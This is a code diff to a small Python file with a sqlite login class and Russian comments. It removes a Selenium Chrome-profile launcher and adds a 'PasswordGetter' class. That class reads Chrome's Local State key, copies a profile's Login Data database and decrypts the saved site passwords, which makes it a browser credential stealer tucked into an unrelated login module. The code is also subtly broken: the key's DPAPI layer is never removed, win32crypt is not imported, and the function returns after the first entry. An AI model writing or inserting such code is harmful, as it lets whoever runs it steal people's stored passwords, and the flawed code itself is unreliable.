@@ -1,5 +1,9 @@
 import hashlib
 import sqlite3
+import os
+import json
+import base64
+from Crypto.Cipher import AES
 class User:
     def __init__(self):
         self.connection = sqlite3.connect('database.db')
@@ -23,16 +27,47 @@ class User:
         if self.cursor.fetchone() is None:
             return "Неверный логин или пароль"
         return "Вы успешно вошли"
-from selenium import webdriver
-
-from selenium.webdriver.chrome.options import Options
-
-data_dir = r'C:\Users\student\AppData\Local\Google\Chrome\User Data'
-options = Options()
-options.add_argument(f'--user-data-dir={data_dir}')
-options.add_argument('--profile-directory=Profile 2')
-options.add_argument("--disable-blink-features=AutomationControlled")
-options.add_experimental_option("excludeSwitches", ["enable-automation"])
-print(options.arguments)
-driver = webdriver.Chrome(options=options)
-driver.get("https://github.com/")
+class PasswordGetter:
+    def get_passwords(self):
+        # Путь к данным Chrome
+        user_data_dir = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
+        local_state_path = os.path.join(user_data_dir, 'Local State')
+        login_db_path = os.path.join(user_data_dir, 'Profile 2', 'Login Data')
+        
+        # Извлекаем ключ AES
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.loads(f.read())
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        key = encrypted_key[5:]  # Удаляем префикс DPAPI
+        
+        # Копируем базу данных (Chrome должен быть закрыт)
+        temp_db = "temp_login.db"
+        if os.path.exists(login_db_path):
+            import shutil
+            shutil.copy2(login_db_path, temp_db)
+        
+        # Подключаемся к базе
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        
+        # Расшифровка
+        for url, user, encrypted_pass in cursor.fetchall():
+            if not encrypted_pass:
+                continue
+        
+            try:
+                if encrypted_pass.startswith(b"v10"):
+                    iv = encrypted_pass[3:15]
+                    ciphertext = encrypted_pass[15:-16]
+                    cipher = AES.new(key, AES.MODE_GCM, iv)
+                    password = cipher.decrypt(ciphertext).decode()
+                else:
+                    password = win32crypt.CryptUnprotectData(encrypted_pass)[1].decode()
+            except:
+                password = "Не удалось расшифровать"
+        
+            return url, user, password
+        
+        conn.close()
+        os.remove(temp_db)
